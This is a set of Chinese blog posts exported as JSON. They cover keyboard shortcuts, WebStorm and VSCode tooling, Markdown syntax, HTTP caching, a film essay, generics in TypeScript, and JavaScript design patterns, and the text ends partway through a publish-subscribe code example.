Windows设备等快捷操作\u0026hellip;\n一、基础键位 \u0026amp; Mac Windows / Linux 1 Command Win 2 Control Ctrl 3 option Alt 二、Mac和Windows 对应按键请自行替换，如Command自行替换为Win\n1.系统 MacOS:\nCommand + 空格 # 聚焦搜索 Command +（-） # 放大（缩小）视图 Control + 左右方向键 # 切换主屏幕视图 Command + Control + Q # 锁屏 Linux-Deepin:\nCtrl + Alt + T # Terminal 终端 Ctrl + Alt + ESC # 系统监视器 Shift + 空格 # 全局应用搜索 Ctrl + Shift + S # 截图 - 可调整，通常是Ctrl + Shift + S Ctrl + H # 切换隐藏文件 Win + S / A # 切換多任务视图 Win + L # 锁屏 2.文件处理 MacOS:\nCommand + c/v/z/x # 文件操作 Command + N # 文件新建 Linux-Deepin:\n# 终端：增加 Shift Ctrl + Shift + S # 保存 Ctrl + Alt + C / V / Z # 复制/粘贴/撤回 # 非终端 Ctrl + S # 保存 Ctrl + C / V / Z # 复制/粘贴/撤回 2.桌面(日常)软件 MacOS:\n# 微信 Shift + Command + W # 显示/隐藏主面板 Shift + Command + A # 截图 Linux-Deepin:\n# 微信 Ctrl + Alt + W # 微信: 显示/隐藏 # 输入法 Ctrl + Shift # 切换输入法 Shit # 输入法切换中/英文 3.桌面(开发)软件 MacOS:\n# Chrome Shift + Command + F # 全屏模式下：隐藏/展示头部导航栏菜单 # VSCode # 更多快捷键 https://segmentfault.com/a/1190000012047237 Shift + Command + N # 打开一个新窗口 Shift + Option + F # 格式化 code Command + 鼠标左键 # 进入：当前函数，在开发语言内对应的使用介绍 Command + / # 单行注释 Shift + Option + A # 多行注释 Linux-Deepin:\n# Chrome Ctrl + Shift + C # Chrome 开发者模式 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/computer-basics/shortcut-keys/","summary":"\u003cp\u003e\u003ccode\u003eMacOS / Linux / Windows\u003c/code\u003e设备等快捷操作\u0026hellip;\u003c/p\u003e","title":"工具: 快捷键（Shortcut keys）"},{"content":"webstorm使用中的问题和快捷键\u0026hellip;\n一、使用中的问题 1.破解 IntelliJ IDEA 注册码\n2.解决卡顿问题 http://blog.csdn.net/nideshijian/article/details/53174028\n2.1 excluded 大文件 扫描排除大文件\n对应文件右键 -\u0026gt; mark directory as -\u0026gt; excluded（排除)\n2.2 修改webstorm内存 # 路径JetBrains/WebStorm/bin/WebStorm.exe.vmoptions # 编辑器 打开 修改 -Xms526m -Xmx1024m（ps：-Xms最大值不能超过1024，否则webstorm将无法打开） # 重启webstorm 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/other/editortools-webstorm/","summary":"\u003cp\u003ewebstorm使用中的问题和快捷键\u0026hellip;\u003c/p\u003e","title":"webstorm"},{"content":"vsCode编辑器相关的拓展插件extension\u0026hellip;\n一、编码相关 参考文章1 参考文章2\n1.编码能力 Auto Close Tag：自动闭合HTML/XML标签 Auto Rename Tag：自动完成另一侧标签的同步修改 Beautify：格式化代码，支持自定义格式化代码规则, 默认格式化代码按键为cmd+b ESLint: js语法纠错，可以自定义配置，配置较为复杂，建议使用网上一些广泛使用的eslint配置 HTML Snippets: 智能提示HTML标签，以及标签含义 HTML CSS Support: 智能提示CSS类名以及id Vetur: Vue多功能集成插件，包括：语法高亮，智能提示，emmet，错误提示，格式化，自动补全，debugger。vscode官方钦定Vue插件 ESLint Rules eslint-config-google TypeScript Vue Plugin (Volar) 2.3D相关 glTF Tools v2.3.16: Tools for glTF and GLB 3D models 二、拓展工具 1.Git相关 git log\nGit History: VS Code 自带的扩展程序，用于查看和浏览基础的 Git 提交历史记录 GitLens: 功能强大，提供丰富图形表示 Git 历史记录和历史修改人，包括时间线视图、分支图和提交详细信息 2.LeetCode 常见的两个配置问题：\n登陆问题：国外版已经切换，目前国内版还处于正常状态。若出现问题，选择第三方登录或cookie登录。 leetcode配置 配置代码存放的文件路径: 配置名为leetcode.workspaceFolder，默认的路径是$HOME/.leetcode。可通过终端echo $HOME查看$HOME路径 编辑器的快捷方式：leetcode调试页一般会有两个按钮Submit和Test。另外，可通过leetcode.editor.shortcuts配置，增加Solution查看当前最高赞的代码和Description显示问题描述 参考: 常见配置和使用\n3.Markdown All in One 内容较长的markdown文件不便阅读，GitHub又不能通过 toc标签自动生成，所以我们只能通过该插件在vscode生成添加toc目录后再上传。 注意：若修改标题结构，则需删除生成的旧目录，【重新生成】。\n在VSCode中安装Markdown All in One插件 按下Command+Shift+P，输入toc，选择创建目录（Markdown All in One: Create Table of Contents），会自动为markdown文件生成目录。 参考：在VSCode中为markdown文件自动生成目录\n4.Markdown Preview Mermaid Support 使用文档相关，可搜素Mermaid查看。mermaid: cloud_notes\n5.koroFileHeader 用于生成文件头部注释和函数注释的VSCode插件，包括作者、日期、文件路径等信息，支持所有主流语言。\n以下是使用 koroFileHeader 插件的基本步骤：\n1.安装完成后，依次点击VSCode的左下角设置图标 -\u0026gt; \u0026quot;扩展\u0026quot; -\u0026gt; koroFileHeader插件 -\u0026gt; 配置Icon -\u0026gt; 扩展配置 -\u0026gt; Fileheader: Custom Mode(在setting.json里配置)。配置的具体选项可以在插件的文档中找到。\n\u0026#34;fileheader.customMade\u0026#34;: { \u0026#34;Author\u0026#34;: \u0026#34;lianpf\u0026#34;, \u0026#34;Date\u0026#34;: \u0026#34;${currentYear}-${currentMonth}-${currentDate}\u0026#34;, \u0026#34;LastEditors\u0026#34;: \u0026#34;${username}\u0026#34;, // 你的系统名称 \u0026#34;LastEditTime\u0026#34;: \u0026#34;${currentYear}-${currentMonth}-${currentDate} ${currentHour}:${currentMinute}:${currentSecond}\u0026#34;, \u0026#34;Description\u0026#34;: \u0026#34;Your Description\u0026#34;, \u0026#34;FilePath\u0026#34;: \u0026#34;${relativeFileDir}\u0026#34; // 插入当前文件的相对路径 } 2.配置后，会在你的文件顶部，插入一行类似以下的注释块：\n\u0026lt;!-- * @Author: your name * @Date: 2023-08-29 09:32:43 * @LastEditors: your name * @LastEditTime: 2023-08-29 15:05:06 * @FilePath: your file path * @Description: your description --\u0026gt; 当你新增/修改文件内容时，保存文件后插件会根据你的设置自动更新注释块中的 LastEditors 和 LastEditTime 等信息。\n3.手动触发： 如果插件配置正确但仍未自动生效，你可以在编辑器中，尝试使用快捷键Ctrl + Command + I手动触发文件头的生成。\n4.如果想让 koroFileHeader 插件忽略某些文件，决定哪些文件不需要生成文件头。可在项目根目录下创建一个 .koroignore 文件，列出想要忽略的文件或文件夹的规则。\n以下是一个示例 .koroignore 文件的内容：\n# 忽略所有 .txt 文件 *.txt # 忽略 assets 文件夹 /assets/ # 忽略特定文件 ignore_this_file.js 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/other/editortools-vscode/","summary":"\u003cp\u003e\u003ccode\u003evsCode\u003c/code\u003e编辑器相关的拓展插件\u003ccode\u003eextension\u003c/code\u003e\u0026hellip;\u003c/p\u003e","title":"编程工具: VSCode"},{"content":"markdown语法\u0026hellip;\n一、标准基础语法 1. 文本 \u0026amp; 标题 (1) 标题 // 几个#号表示几级标题 # 一级标题 ... #### 四级标题 (2) 引用 \u0026gt; 引用 text // 一个\u0026gt;号变引用。即可呈现出灰色底色引用的效果 (3) 加粗、斜体和删除 *text* // 一对*是斜体 **text2** // 两对*是加粗 ***text3*** // 多对*号斜粗体 ~~11~~ // 两对~~是删除 示例:\n斜体 加粗 斜体加粗 删除\n引用 text\n2. 图片 \u0026amp; 链接 (1) 图片 // Alt 和 Title 都不是必须的，可以省略，但建议写上 // Alt的意思是如果图片因为某些原因不能显示，就用定义的图片Alt文字来代替图片 // Title表示鼠标悬停与图片上时出现的文字 ![Alt](src “Title”) // 可省略为 ![](src) (2) 超链接 [Tag](href) // 括号里是对应的链接。例：[百度](https://www.baidu.com) 3. 分隔线 \u0026amp; 列表 \u0026amp; 表格 (1) 分隔线 *** // 三个以上的星号、减号、底线建立一个分割线 (2) 列表 // 有序列表 1. Bird 2. McHale // 无序列表。使用`*`,`+`,`-`中任意一种来表示 - red + Green * Blue (3) 表格 // |表示分割线，:表示文案对齐方式 | 项目 | 价格 | 数量 | :--- | ---:| :---: | Computer | 1600 元 | 5 | Phone | 12 元 | 12 示例:\n项目 价格 数量 Computer 1600 元 5 Phone 12 元 12 4. 代码块 在3对`号内插代码，表示插入一段高亮代码。 在1对`号内插入代码，表示插入一行高亮代码 @requires_authorization def somefunc(param1=\u0026#39;\u0026#39;, param2=0): \u0026#39;\u0026#39;\u0026#39;A docstring\u0026#39;\u0026#39;\u0026#39; if param1 \u0026gt; param2: # interesting print \u0026#39;Greater\u0026#39; return (param2 - param1 + 1) or None 二、文案特殊标识和颜色 1. 特殊标识：emoji 标识搜索地址：emoji\n常用标识: 🍓、📌、📍、🔨、🛠️、🇨🇳\n2. 通用颜色设置 (1) diff 比对 // 1.```diff：代码块加diff标识。2.+或-符号 + ## test - 123 示例:\n+ ## test - 123 3. 常用工具: VSCode \u0026amp; Typora为代表 非Gitee和GitHub:\n(1) font标签 \u0026lt;font color=\u0026#34;#d14\u0026#34;\u0026gt;文案加强\u0026lt;/font\u0026gt; // 红色 (2) 有道云加色 ==text== (3) img标识颜色 ![#f03c15](https://via.placeholder.com/15/f03c15/000000?text=+) `#f03c15` ![#c5f015](https://via.placeholder.com/15/c5f015/000000?text=+) `#c5f015` ![#1589F0](https://via.placeholder.com/15/1589F0/000000?text=+) `#1589F0` 示例(3): #f03c15、 #c5f015、 #1589F0\n4. Html样式: Gitee\u0026amp;GitHub 为了保证和GitHub渲染的一致，Gitee将Markdown解析器更换为 CommonMark\n\u0026lt;!--```html 代码块标识为html --\u0026gt; \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt; font-blue { color: #3693ff; } font-green { color: #19be6b; } font-yellow { color: #f90; } font-red { color: #ed4014; } \u0026lt;/style\u0026gt; \u0026lt;font-blue\u0026gt;font blue\u0026lt;/font-blue\u0026gt; \u0026lt;font-green\u0026gt;font green\u0026lt;/font-green\u0026gt; \u0026lt;font-yellow\u0026gt;font yellow\u0026lt;/font-yellow\u0026gt; \u0026lt;font-red\u0026gt;font red\u0026lt;/font-red\u0026gt; 示例:\n文本blue：font blue tag blue：tag blue 三、其他编辑器可能支持语法 在线编辑器 https://www.zybuluo.com/mdeditor\n1. 流程图/序列图/甘特图 (1) 流程图 // ```flow 代码块标识为flow st=\u0026gt;start: 开始 e=\u0026gt;end: 结束 op=\u0026gt;operation: 我的操作 cond=\u0026gt;condition: 确认？ st-\u0026gt;op-\u0026gt;cond cond(yes)-\u0026gt;e cond(no)-\u0026gt;op (2) 序列图 // ```sequence 代码块标识为sequence 张三-\u0026gt;李四: 嘿，小四儿, 写博客了没? Note right of 李四: 李四愣了一下，说： 李四--\u0026gt;张三: 忙得吐血，哪有时间写。 (3) 甘特图 // ```gantt 代码块标识为gantt dateFormat YYYY-MM-DD title 产品计划表 section v1.0 明确需求: done, des1, 2018-01-06,3d 跟进开发: 2018-01-09, 4d 走查测试: 2018-01-13, 3d section v2.0 明确需求: 2018-01-12,72h 跟进开发: 2018-01-16, 6d 走查测试: 2018-01-22, 3d section v3.0 复测: 2018-01-16, 10d 2. 脚注 用法示例\n这是一个脚注的例子[^1] [^1]: 这里是脚注 3. 目录 [TOC] # h0 ## h1 ## h2 ##### h6 4. 数学公式 // 行内公式 $\\Gamma(n) = (n-1)!\\quad\\forall n\\in\\mathbb N$ // 块级公式 $$ \\sum_{i=0}^n i^2 = \\frac{(n^2+n)(2n+1)}{6} $$ 四、在VSCode中的配置 1.自动生成目录toc markdown-all-in-one\n最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/other/14.markdown/","summary":"\u003cp\u003emarkdown语法\u0026hellip;\u003c/p\u003e","title":"Markdown: 语法\u0026编辑工具"},{"content":" 大家不应该仅仅局限于知道浏览器会对请求的静态文件进行缓存, 但是为什么被缓存, 缓存是 怎么生效的, 也要清清楚楚\n一、 理解 http 缓存机制的必要性 http 缓存机制作为Web性能优化的重要手段, 是计算机知识体系中的一个基础的环节, 同时也是前端架构师同学的必备技能\n二、缓存规则解析 为方便大家理解，我们可以认为浏览器存在一个缓存数据库,用于存储缓存信息. 在客户端第一次请求数据时，此时缓存数据库中没有对应的缓存数据，需要请求服务器，服务器返回后，将数据存储至缓存数据库中\n根据是否需要重新向服务器发起请求来分类(强制缓存, 对比缓存)。 首先通过时序图的方式, 对他们有个简单的了解:\n已存在缓存数据 仅基于强制缓存，请求数据的流程如下: 仅基于对比缓存，请求数据的流程如下: 可以看到，强制缓存如果生效，不需要再和服务器发生交互，而对比缓存不管是否生效，都需要与服务端发生交互\n当执行强制缓存的规则时，如果缓存生效，直接使用缓存，不再执行对比缓存规则\n1.强制缓存 在没有缓存数据的时候，浏览器向服务器请求数据时，服务器会将数据和缓存规则一并返回， 缓存规则信息包含在响应header中\n浏览器是如何判断缓存数据是否失效呢 强制缓存来机制中，响应header中会有两个字段来标明失效规则\nExpires/Cache-Control Expires 是HTTP 1.0的东西，现在默认浏览器均默认使用HTTP 1.1，所以它的作用基本忽略。HTTP 1.1 的版本中，使用Cache-Control替代\n2.协商缓存 顾名思义，需要进行比较判断是否可以使用缓存\n通过两图的对比，我们可以很清楚的发现，在对比缓存生效时，状态码为304，并且报文大小和请求时间大大减少。 原因是，服务端在进行标识比较后，只返回header部分，通过状态码通知客户端使用缓存，不再需要将报文主体部分返回给客户端\n对比缓存标识一共分为两种标识传递:\nLast-Modified / If-Modified-Since Etag / If-None-Match（优先级高于Last-Modified / If-Modified-Since） Etag\n服务器响应请求时，告诉浏览器当前资源在服务器的唯一标识（生成规则由服务器决定） If-None-Match\n再次请求服务器时，通过此字段通知服务器客户段缓存数据的唯一标识\n服务器收到请求后发现有头If-None-Match 则与被请求资源的唯一标识进行比对， 不同，说明资源又被改动过，则响应整片资源内容，返回状态码200； 相同，说明资源无新修改，则响应HTTP 304，告知浏览器继续使用所保存的cache\n三、总结 1.缓存使用规则 对于强制缓存，服务器通知浏览器一个缓存时间，在缓存时间内，下次请求，直接用缓存，不在时间内，执行比较缓存策略 对于比较缓存，将缓存信息中的Etag和Last-Modified通过请求发送给服务器，由服务器校验，返回304状态码时，浏览器直接使用缓存 2.浏览器请求 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n参考文章: 彻底弄懂HTTP缓存机制及原理\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/computer-basics/04.http-cache/","summary":"大家不应该仅仅局限于知道浏览器会对请求的静态文件进行缓存, 但","title":"网络原理: http缓存机制及其原理"},{"content":"最好的喜剧永远是悲剧? 张弛在夕阳下驾车飞下悬崖是最好的结局? 大概每个人心底都有一份不完全相同的答案吧！\n喜剧的内核永远是悲剧? 有人说, 喜剧的内核永远是悲剧, 默剧大师叶逢春的节目才撑得上真正的喜剧。当然, 我个人很喜欢他的节目, 但是对于这样的观点却仍然不敢苟同。所以， 我只能大概猜测一下这部分受众的心理和角度, 是因为喜剧到悲剧的转折让喜剧本身显的别具一格？是因为这部分的喜剧通常会走进你的内心, 触动你心底的某片柔软，挥着顿时彻悟？还是让你收获了这世间最难得也最简单的快乐?\n在看《飞驰人生》的时候, 张驰回到驾校重新练车的时候，那个诙谐的片段, 差点儿给我笑疯; 一个曾经在赛车节叱咤风云的赛车手因禁赛而只能在经营炒饭大排档的间隙, 用马桶塞子和脸盆练车的那五年也 触碰到了我心里的那片柔软, 即使没有所谓的顿悟, 我也很喜欢; 在电影的最后一幕, 夕阳之下，张驰驾车飞下悬崖， “为了所热爱的事情，奉献你的一切”, 这个和喜剧本身巨大反转的结局让我震感, 喜欢却又不喜欢。\n所以, 最好的喜剧一定要是悲剧么？ 也许是, 也许也不是吧！\n对我来说，巴音布鲁克没有海，heroes never die 在电影最后一幕, 夕阳之下, 伴随着《奉献》的背景音乐, 张弛驾车飞下了悬崖, \u0026ldquo;为了所热爱的事情，奉献你的一切\u0026rdquo;。\n这个画面让我回到了少年时代的热血澎湃, \u0026ldquo;梦想和坚持\u0026quot;终于有了最好的结局, 也停留在了张弛最好的阶段。 然而影片最后的彩蛋告诉, 决战时，儿子张飞将一个硬币投进车里，赛车变成了飞机，飞上了天空, 背景音乐字幕出现＂Heroes never die＂。\n对我来说，我贪心的相信, 巴音布鲁克没有海，heroes never die。\n请相信你人生的每个阶段内心时刻所相信的 最近, 我看到一个很有意思的想法(在此不针对任何和这个情景相关的人, 请不要对号入座)。 一个已经进入社会工作的程序猿, 想要脱离现在的阶层或者说环境, 选择去考研深造, 接触\u0026quot;更深层次\u0026rdquo; 的研究生同学和导师。\n当然, 这个观点本身并没有什么让我不舒服的地方。恺哥在汕头, 柯总在香港, 我的很多朋友也都 选择在高校深造。在我看来, 作为技术人, 是靠几年的项目经验积累然后去大厂深造或者直接考研读博深造, 只是选择的差异, 本身并没有什么区别。\n这个哥们很有意思的一个观点是, 在有个朋友给他推荐去BAT、TMD等大厂研习技术的时候, 他 劝对方要转变思路, 考研才能预见更有层次的人群, 意思是即使进了大厂的那些大佬也还是这个层次?\n暂且不说, 这位小哥, 你是不是对大厂的实力有什么误解？ 阿里云的网络专家\u0026quot;道哥\u0026quot;, 普度众猿学习的\u0026quot;阮一峰\u0026quot;老师你是没听过么？还是, 蚂蚁金服的开源项目给企业带来了多少福音, 你一丝一毫都不知道？ 国内外那些优秀的技术团队, 即使科研能力不敢和那些知名的计算机大学教授相比, 但是在实践应用方面, 是他们守护着整个世界的互联网秩序和安全, 甚至在承担着政府的社会职能吧！\n而且, 你是认真的么, 考完了计算机的研究生, 除了去研究院(概率微乎其微), 你大概率还是 要继续在程序猿的大军中深造的吧！所以, 你的小脑瓜子到底在想什么?\n在我看来, 大厂的技术环境和能力, 即使不敢说比学院派之上, 但是也不会逊色的吧！\n更为重要的是, 让你成长的, 环境起到的左右不能说微乎其微, 最多也只能算是引导的地步吧。你在学校 深造的内容, 遇到更高层次的人, 总归要应用于现实。\n在你看来, 你是对的; 在我看来, 我的更没有错！\n每个人, 每件事， 每个你成长的阶段, 都应该有自己理解，并且请相信你的理解!\n最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n参考 《飞驰人生》结尾成迷，你看懂了吗？ 韩寒回应《飞驰人生》结局：每个人都有自己理解，请相信你的理解 本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/other/article-nolongertoleratetragedies/","summary":"最好的喜剧永远是悲剧? 张弛在夕阳下驾车飞下悬崖是最好的结局?","title":"再也看不惯悲剧的我们-《飞驰人生》"},{"content":" \u0026ldquo;泛型\u0026rdquo;, 计算机编程中, 一个必不可少的概念。\n简单理解泛型 什么是泛型 泛型是程序设计语言的一种特性。通过参数化类型来实现在同一份代码上操作多种数据类型。\n对于强类型语言来书, 提到参数，最熟悉不过的就是定义 function A 时有形参，然后调用 A 时传递实参。 指定一个表示类型的变量，用它来代替某个实际的类型用于编程，而后通过实际调用时传入类型 来对其进行替换，以达到一段使用泛型程序可以实际适应不同类型的目的。\n注: 各种程序设计语言和其编译器、运行环境对泛型的支持均不一样\n泛型解决的问题 可重用性 类型和算法安全 效率 这是非泛型类和非泛型方法无法具备的\n常见的情形 你有一个函数，它带有一个参数，参数类型是A，然而当参数类型改变成B的时候，你不得不复制这个函数\n例如，下面的代码中第二个函数就是复制第一个函数——它仅仅是用String类型代替了Integer类型\nfunc areIntEqual(x: Int, _ y: Int) -\u0026gt; Bool { return x == y } func areStringsEqual(x: String, _ y: String) -\u0026gt; Bool { return x == y } areStringsEqual(\u0026#34;ray\u0026#34;, \u0026#34;ray\u0026#34;) // true areIntEqual(1, 1) // true 通过采用泛型,可以合并这两个函数为一个并同时保持类型安全。下面是代码实现\n// 用一个通用的数据类型T来作为一个占位符，等待在实例化时用一个实际的类型来代替 func areTheyEqual(x: T, _ y: T) -\u0026gt; Bool { return x == y } areTheyEqual(\u0026#34;ray\u0026#34;, \u0026#34;ray\u0026#34;) areTheyEqual(1, 1) JavaScript和泛型的对应关系 泛型 和 模板方法(设计)模式 在一个系列的行为中，有一些是确定的，有一些是不明确的，我们把确定的行为定义在一个抽象类中， 不确定的行为定义为抽象方法，由具体的子类去实现，这种不影响整个流程，但可以应对各种情况的方法 就可以称之为模板方法模式\ndemo - Coffee or Tea\n几个步骤:\n把水煮沸 用沸水浸泡茶叶 把茶水倒进杯子 加柠檬 /* 抽象父类：饮料 */ var Beverage = function(){}; Beverage.prototype.boilWater = function() { console.log(\u0026#34;把水煮沸\u0026#34;); }; Beverage.prototype.brew = function() { throw new Error(\u0026#34;子类必须重写brew方法\u0026#34;); }; Beverage.prototype.pourInCup = function() { throw new Error(\u0026#34;子类必须重写pourInCup方法\u0026#34;); }; Beverage.prototype.addCondiments = function() { throw new Error(\u0026#34;子类必须重写addCondiments方法\u0026#34;); }; /* 模板方法 */ Beverage.prototype.init = function() { this.boilWater(); this.brew(); this.pourInCup(); this.addCondiments(); } /* ------------分割线------------ */ /* 实现子类 Coffee*/ var Coffee = function(){}; Coffee.prototype = new Beverage(); // 重写非公有方法 Coffee.prototype.brew = function() { console.log(\u0026#34;用沸水冲泡咖啡\u0026#34;); }; Coffee.prototype.pourInCup = function() { console.log(\u0026#34;把咖啡倒进杯子\u0026#34;); }; Coffee.prototype.addCondiments = function() { console.log(\u0026#34;加牛奶\u0026#34;); }; var coffee = new Coffee(); coffee.init(); /* 实现子类 Tea*/ var Tea = function(){}; Tea.prototype = new Beverage(); // 重写非公有方法 Tea.prototype.brew = function() { console.log(\u0026#34;用沸水冲泡茶叶\u0026#34;); }; Tea.prototype.pourInCup = function() { console.log(\u0026#34;把茶倒进杯子\u0026#34;); }; Tea.prototype.addCondiments = function() { console.log(\u0026#34;加柠檬\u0026#34;); }; var tea = new Tea(); tea.init(); 这里的Beverage.prototype.init就是所谓的模板方法\n它作为一个算法的模板指导子类以何种顺序去执行哪些方法，在其内部，算法内的每一 个步骤都清楚的展示在我们眼前\n泛型 和 TypeScript 泛型函数 泛型类 TypeScript 为 JavaScriopt 带来了强类型特性，但这就意味着限制了类型的自由度。同一段程序， 为了适应不同的类型，就可能需要写不同的处理函数\n而且这些处理函数中所有逻辑完全相同，唯一不同的就是类型——这严重违反抽象和复用代码的原则\n泛型函数 js源码\nvar service = { getStringValue: function() { return \u0026#34;a string value\u0026#34;; }, getNumberValue: function() { return 20; } }; function middleware(value) { console.log(value); return value; } var sValue = middleware(service.getStringValue()); var nValue = middleware(service.getNumberValue()); ts改写使用泛型\nconst service = { getStringValue(): string { return \u0026#34;a string value\u0026#34;; }, getNumberValue(): number { return 20; } }; // 泛型方法改造 function middleware\u0026lt;T\u0026gt;(value: T): T { console.log(value); return value; } var sValue = middleware(service.getStringValue()); var nValue = middleware(service.getNumberValue()); middleware 后面紧接的\u0026lt;T\u0026gt;表示声明一个表示类型的变量，Value: T 表示声明参数是 T 类型的， 后面的 : T 表示返回值也是 T 类型的 到这里为止, TS改造之后的泛型方法和改造之前的js代码没什么区别。 现在的问题是 middleware 要怎么样定义才既可能返回 string，又可能返回 number，而且还能被类型检查正确推导出来？ 如果不使用泛型方法要实现这个功能的代码实现:\n第 1 个办法，用 any:\nfunction middleware(value: any): any { console.log(value); return value; } 这个办法可以检查通过。但它的问题在于 middleware 内部失去了类型检查，在后在对 sValue 和 nValue 赋值的时候， 也只是当作类型没有问题。简单的说，是有“假装”没问题\n第 2 个办法，多个 middleware:\nfunction middleware1(value: string): string { ... } function middleware2(value: number): number { ... } 或者用 TypeScript 的重载(overload)来实现\nfunction middleware(value: string): string; function middleware(value: number): number; function middleware(value: any): any { // 实现一样没有严格的类型检查 } 这种方法最主要的一个问题是……如果我有 10 种类型的数据，就需要定义 10 个函数(或重载)， 那 20 个，200 个呢……\n泛型类 即在声明类的时候声明泛型，那么在类的整个作用域范围内都可以使用声明的泛型类型, 多数 时候是应用于容器类\n背景: 假设我们需要实现一个 FilteredList，我们可以向其中 add()(添加) 任意数据， 但是它在添加的时候会自动过滤掉不符合条件的一些，最终通过 get all() 输出所有符合条件的数据(数组)。 而过滤条件在构造对象的时候，以函数或 Lambda 表达式提供\n// 声明泛型类，类型变量为 T class FilteredList\u0026lt;T\u0026gt; { // 声明过滤器是以 T 为参数类型，返回 boolean 的函数表达式 filter: (v: T) =\u0026gt; boolean; data: T[]; constructor(filter: (v: T) =\u0026gt; boolean) { this.filter = filter; } add(value: T) { if (this.filter(value)) { this.data.push(value); } } get all(): T[] { return this.data; } } // 处理 string 类型的 FilteredList const validStrings = new FilteredList\u0026lt;string\u0026gt;(s =\u0026gt; !s); // 处理 number 类型的 FilteredList const positiveNumber = new FilteredList\u0026lt;number\u0026gt;(n =\u0026gt; n \u0026gt; 0); 甚至还可以把 (v: T) =\u0026gt; boolean 声明为一个类型，以便复用:\ntype Predicate\u0026lt;T\u0026gt; = (v: T) =\u0026gt; boolean; class FilteredList\u0026lt;T\u0026gt; { filter: Predicate\u0026lt;T\u0026gt;; data: T[]; constructor(filter: Predicate\u0026lt;T\u0026gt;) { ... } add(value: T) { ... } get all(): T[] { ... } } 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/computer-basics/05.js-design-generics/","summary":"\u0026ldquo;泛型\u0026rdquo;, 计算机编程中, 一个必不可少","title":"谈谈 JS 和 设计泛型"},{"content":"一个模式就是一个可重用的方案。当代码是建立在行之有效的模式上时,我们可以花更少的时间去关心我们的代码结构,从而能花\u0026hellip;\n引言 设计模式分类 常见设计模式 单例模式 观察者模式 工厂模式 策略模式 代理模式 引言 JavaScript 设计模式，一个模式就是一个可重用的方案。当代码是建立在行之有效的模式上时,我们可以花更少的时间去关心我们的代码结构,从而能花更多的时间关注我们的解决方案的整体质量。\n设计模式分类 三大类\n「创建型模式」 5种\n单例模式 工厂方法模式 抽象工厂模式 建造者模式 原型模式 「结构型模式」 7种\n代理模式 适配器模式 装饰器模式 外观模式 桥接模式 组合模式 享元模式 「行为型模式」 11种\n观察者模式 策略模式 模板方法模式 迭代子模式 责任链模式 命令模式 备忘录模式 状态模式 访问者模式 中介者模式 解释器模式 常见设计模式 1. 单例模式 Singleton Pattern: 1-1 原理 顾名思义就是保证每个类都只有一个实例对象（调用一个类，任何时候返回的都是同一个实例）\n1-2 实现方法 使用一个变量来标志当前是否已经为某个类创建过对象，如果创建了，则在下一次获取该类的实例时， 直接返回之前创建的对象，否则就创建一个对象\n1-3 coding var Universe; (function () { var instance; Universe = function Universe() { if (instance) { return instance; } instance = this; // 其它内容 this.start_time = 0; this.bang = \u0026#34;Big\u0026#34;; }; } ()); //测试代码 var a = new Universe(); var b = new Universe(); alert(a === b); // true 1-4 场景 用于: 一个全局使用的类频繁地创建与销毁\n要求生产唯一序列号 WEB 中的计数器，不用每次刷新都在数据库里加一次，用单例先缓存起来 创建的一个对象需要消耗的资源过多，比如 I/O 与数据库的连接等 2. 发布订阅(观察者模式) 2-1 原理 当对象间存在一对多关系时，则使用观察者模式. 比如，当一个对象被修改时，则会自动通知它的依赖对象\n2-2 实现方法 订阅，就是把几个函数推入数组中待用； 发布，就是把缓存在数组中的那一坨函数列队执行\n2-3 coding var event = { eventList:{}, listen:function(key,fn){ if(!this.eventList[key]){ this.eventList[key] = []; } this.eventList[key].push(fn); }, remove:function(key,fn){ var fns = this.eventList[key]; if(!fns){ return false; } if(!fn){ // 如果没有回调，表示取消此key下所有方法 fns \u0026amp;\u0026amp; (fns.length=0); // 这是一种快速清空数组的方法哦！ }else{ for(var i=0;i\u0026lt;fns.length;i++){ //遍历方法列表,剔除需要取消的方法 //要注意fns是引用型变量，实际是去除了this.eventList[key]下的方法。 if(fns[i] === fn){ fns.splice(i,1); } } } }, //trigger(\u0026#39;loginSuccess\u0026#39;,参数1,参数2) trigger:function(){ //出列第一个数据：\u0026#39;loginSuccess\u0026#39; var key = Array.prototype.shift.call(arguments); var fns = this.eventList[key];//拿到一组函数 if(!fns || fns.length === 0){ //没有要执行的函数，就返回 return false; } for(var i=0;i\u0026lt;fns.length;i++){ //arguments已经出列了一个数据，目前全是参数列表了 fns[i].apply(this,arguments); } } }; var installEvent = function(obj){ for(var i in event){ obj[i] = event[i]; } } var login = {}; installEvent(login); //显示头像 function showAvatar(){ console.log(\u0026#39;显示用户头像\u0026#39;); } //显示消息列表 function showMessage(){ console.log(\u0026#39;显示消息列表\u0026#39;); } //订阅 